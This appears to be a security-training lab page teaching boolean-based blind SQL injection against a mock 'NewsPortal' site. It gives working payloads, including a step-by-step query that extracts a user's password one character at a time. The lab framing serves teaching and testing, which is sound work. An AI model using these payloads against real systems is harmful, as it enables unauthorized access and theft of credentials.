Mission Control
Blind SQL Injection (Boolean)

Welcome to NewsPortal. Test for SQL injection vulnerabilities.

Objective

Extract data using boolean-based blind SQLi

Blind SQLi occurs when you can't see query results directly, but can infer information from the application's behavior. Test with: ' AND '1'='1 (true) vs ' AND '1'='2 (false). Different responses indicate vulnerability.

Extract data character by character using: ' AND SUBSTRING(username,1,1)='a'--. If the page behaves normally, the first character is 'a'. Repeat for each character.

Step-by-step:
  1. Test: ?id=1' AND '1'='1'-- (page loads normally)
  2. Test: ?id=1' AND '1'='2'-- (page behaves differently)
  3. Extract: ?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
  4. Iterate through alphabet for each position
Why it works: Boolean conditions reveal information through application behavior changes.
